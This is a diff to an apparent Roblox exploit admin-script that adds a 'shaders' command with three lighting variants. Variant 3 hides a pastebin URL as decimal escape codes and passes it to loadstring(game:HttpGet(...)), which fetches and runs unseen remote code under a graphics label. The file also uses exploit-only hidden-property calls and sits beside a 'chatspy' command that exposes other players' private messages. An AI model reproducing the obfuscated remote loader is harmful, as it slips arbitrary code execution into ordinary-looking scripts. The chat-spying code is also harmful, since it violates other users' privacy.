@@ -6678,6 +6678,322 @@ AddCommand("antivoid", {"novoid"}, "prevents u from dying to the void", {}, func
     return "enabled"
 end)
 
+AddCommand("shaders", {"beautify"}, "Applies some nice lighting and blur to your game (3 variants)", {}, function(Caller, Args)
+    -- Define the choice (1, 2, or 3)
+local choice = (Args[1])
+
+-- Check if the choice is valid
+if choice == "1" then
+    --(put this in auto-exec if you'd like)
+
+--[[
+CREATED: 2/16/22 @9:43PM EST
+UPDATED: 2/16/22 @10:59PM EST
+
+Never really had the chance to credit myself last time, and so here we are. Based of my old script,
+which I never expected to get extremely popular, "HD Graphics", here's the long awaited sequel.
+
+Join the Discord if you'd like to suggest updates or chill with a small community:
+https://discord.gg/6xcG2DRM7d 👈
+
+I also have videos regarding serversides, and general scripting, so consider joining 👆
+
+IF YOU'RE EDITING THIS, PLEASE LEAVE IN THE CREDITS AND THE DISCORD. 🙏
+
+  _  _ ___     ___ ___    _   ___ _  _ ___ ___ ___ 
+ | || |   \   / __| _ \  /_\ | _ \ || |_ _/ __/ __|
+ | __ | |) | | (_ |   / / _ \|  _/ __ || | (__\__ \
+ |_||_|___/   \___|_|_\/_/ \_\_| |_||_|___\___|___/ scripted by Arman#9312 🔥
+                                                   
+]] 
+
+-- GENERAL SETTINGS (YOU MAY EDIT TO YOUR PREFERENCE/LIKING)
+
+_G.SunRays = {
+	Intensity = tonumber(0.01),
+	Spread = tonumber(0.1),
+}
+
+_G.ColorCorrection = {
+	TintColor = Color3.fromRGB(255, 254, 226),
+	Brightness = tonumber(0.02),
+	Contrast = tonumber(0.02),
+}
+
+_G.Blur = {
+	Size = tonumber(2),
+}
+
+_G.Bloom = {
+	Intensity = tonumber(0.1),
+	Size = tonumber(22),
+	Threshold = tonumber(0.3)
+}
+
+_G.AdjustQualityToFramerate = false
+
+
+--[[
+CREATED: 2/16/22 @9:43PM EST
+UPDATED: 2/16/22 @9:43PM EST
+
+Never really had the chance to credit myself last time, and so here we are. Based of my old script,
+which I never expected to get extremely popular, "HD Graphics", here's the long awaited sequel.
+
+Join the Discord if you'd like to suggest updates or chill with a small community:
+https://discord.gg/6xcG2DRM7d 👈
+
+I also have videos regarding serversides, and general scripting, so consider joining 👆
+
+IF YOU'RE EDITING THIS, PLEASE LEAVE IN THE CREDITS AND THE DISCORD. 🙏
+
+  _  _ ___     ___ ___    _   ___ _  _ ___ ___ ___ 
+ | || |   \   / __| _ \  /_\ | _ \ || |_ _/ __/ __|
+ | __ | |) | | (_ |   / / _ \|  _/ __ || | (__\__ \
+ |_||_|___/   \___|_|_\/_/ \_\_| |_||_|___\___|___/ scripted by Arman#9312 🔥
+                                                   
+]]
+
+--// Highly recommend using the loadstring instead of saving this, because the loadstring auto updates ⚠
+
+local getVariables = {
+	["SunRaysEffect"] = _G.SunRays,
+	["ColorCorrectionEffect"] = _G.ColorCorrection,
+	["BlurEffect"] = _G.Blur,
+	["BloomEffect"] = _G.Bloom,
+};
+
+local function _BETTER_INSTANCE(i, d)
+	if type(d) == "table" then
+		local insert = Instance.new
+		
+		local j = insert(tostring(i), game:GetService("Lighting"))
+		
+		for _,properties in pairs(d) do
+			j[_] = properties
+		end
+	else
+		error("Must be a table instance.")
+	end
+end
+
+local function _BETTER_RENDER()
+	local _,e = pcall(function()
+		local settings = settings
+		settings().Rendering.EnableFRM = true
+
+		if getVariables  then
+			if _G.AdjustQualityToFramerate == true then
+				settings().Rendering.AutoFRMLevel = tonumber(10)
+				settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level02
+				settings().Rendering.GraphicsMode = Enum.GraphicsMode.Automatic
+				settings().Rendering.FrameRateManager = Enum.FramerateManagerMode.Automatic
+				settings().Rendering.ReloadAssets = true
+			else
+				settings().Rendering.QualityLevel = Enum.QualityLevel.Level16
+				settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level04
+			end
+		else
+			settings().Rendering.QualityLevel = Enum.QualityLevel.Level16
+			settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level04
+		end
+	end) if e then print(e) end
+end;pcall(_BETTER_RENDER)
+
+
+
+
+--// SCRIPTING \\--
+
+coroutine.resume(coroutine.create(function() -- Applying changes
+	for _,getType in pairs(getVariables)do
+		_BETTER_INSTANCE(_, getVariables[_])
+	end
+end))
+
+coroutine.resume(coroutine.create(function() -- Apply Lighting changes
+	local getLighting = game:GetService("Lighting")
+	getLighting.GeographicLatitude = tonumber(102)
+	getLighting.ClockTime = tonumber(14.5)
+	getLighting.ExposureCompensation = tonumber(0.07)
+	getLighting.GlobalShadows = true
+
+	if not getLighting:FindFirstChild("Atmosphere") then
+		local Atmosphere = _BETTER_INSTANCE("Atmosphere", {
+			Name = "BETTER_ATMOSPHERE",
+			Color = Color3.fromRGB(199, 199, 199),
+			Decay = Color3.fromRGB(106, 112, 125),
+			Glare = tonumber(0),
+			Haze = tonumber(0),
+			Density = tonumber(0.3),
+			Offset = tonumber(0.25),
+		});
+	else
+		print('"Atmosphere" already exists.')
+	end
+
+	end))
+elseif choice == "2" then
+    -- // Constants \\ --
+
+-- [ Services ] --
+local Services = {}
+Services.RunService = game:GetService("RunService")
+
+-- [ Custom Functions ] --
+local IsExploit = not Services.RunService:IsStudio()
+
+local CustomFunctions = {}
+CustomFunctions.SetHidden = sethiddenproperty or set_hidden_property or set_hidden_prop
+
+-- [ GraphicX ] --
+local GraphicX = {}
+
+-- Create --
+function GraphicX.new(Class, Properties)
+	-- Creates the Instance --
+	local NewInstance = Instance.new(Class)
+
+	-- Sets the Properties --
+	for i,v in pairs(Properties) do
+		if NewInstance[i] ~= nil and i ~= "Parent" then
+			NewInstance[i] = v
+		end
+	end
+
+	-- Sets Parent --
+	if Properties.Parent then
+		NewInstance.Parent = Properties.Parent
+	end
+
+	return NewInstance
+end
+
+function GraphicX.SetProperty(Object, Properties)
+	-- Sets the Properties --
+	for i,v in pairs(Properties) do
+		if Object[i] ~= nil and i ~= "Parent" then
+			Object[i] = v
+		end
+	end
+
+	-- Sets Parent --
+	if Properties.Parent then
+		Object.Parent = Properties.Parent
+	end
+end
+
+-- [ Instances ] --
+local Lighting = game:GetService("Lighting")
+local Terrain = workspace.Terrain
+
+local LightingSaves = GraphicX.new("Folder", {Name = "LightingSaves", Parent = nil})
+
+
+-- // Main \\ --
+function GraphicX.Enhance(Settings)
+	local GraphicSettings = Settings or {
+		FogEnabled = true,
+		WaterEnabled = true
+	}
+	
+	-- [ Clears Lighting ] --
+	for i,v in ipairs(Lighting:GetChildren()) do
+		if v:IsA("PostEffect") and not string.find(v.Name, "GraphicX") then
+			v.Parent = LightingSaves
+		end
+	end
+
+	-- [ Sets Properties ] --
+
+	-- Lighting --
+	if GraphicSettings.FogEnabled then
+		GraphicX.SetProperty(Lighting, {
+			FogEnd = 500,
+			FogStart = 25
+		})
+	end
+
+	if IsExploit then
+		CustomFunctions.SetHidden(Lighting, "Technology", Enum.Technology.Future)
+		settings().Rendering.QualityLevel = 21
+	end
+
+	-- Terrain --
+	if GraphicSettings.WaterEnabled then
+		GraphicX.SetProperty(Terrain, {
+			WaterColor = Color3.fromRGB(131, 165, 164),
+			WaterReflectance = 0.05,
+			WaterTransparency = 1,
+			WaterWaveSize = 1,
+			WaterWaveSpeed = 15
+		})
+	end
+
+	-- [ Creates Effects ] --
+	GraphicX.LightingEffects = {
+		GraphicX.new("BloomEffect", {
+			Name = "GraphicXBloom",
+			Parent = Lighting,
+			Intensity = 0.75,
+			Size = 15,
+			Threshold = 0.95
+		}),
+		GraphicX.new("BlurEffect", {
+			Name = "GraphicXBlur",
+			Parent = Lighting,
+			Size = 5
+		}),
+		GraphicX.new("DepthOfFieldEffect", {
+			Name = "GraphicXDepth",
+			Parent = Lighting,
+			FarIntensity = 0.15,
+			FocusDistance = 0.05,
+			InFocusRadius = 20,
+			NearIntensity = 0.75
+		}),
+		GraphicX.new("SunRaysEffect", {
+			Name = "GraphicXRays",
+			Parent = Lighting,
+			Intensity = 0.1,
+			Spread = 0.1
+		})
+	}
+end
+
+GraphicX.Enhance({
+	FogEnabled = true,
+	WaterEnabled = true
+})
+
+return GraphicX
+elseif choice == "3" then
+    _G.BlurSize = 3
+
+_G.ColorCorrectionBrightness = 0.03
+_G.ColorCorrectionContrast = 0.3
+_G.ColorCorrectionSaturation = 0.01
+_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)
+
+_G.SunRaysIntensity = 0.2
+_G.SunRaysSpread = 1
+
+-- Lighting settings:
+_G.GlobalShadows = true
+_G.Brightness = 0.9
+_G.GeographicLatitude = 350
+_G.TimeOfDay = 17
+_G.ExposureCompensation = 0.03
+
+
+spawn(function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
+end)
+else
+    return "Please choose a variant! Ex: shaders 2"
+end
+end)
+
 AddCommand("chatspy", {"spychat"}, "shows pms from other players", {}, function(Caller, Args)
     --This script reveals ALL hidden messages in the default chat
 --chat "/spy" to toggle!
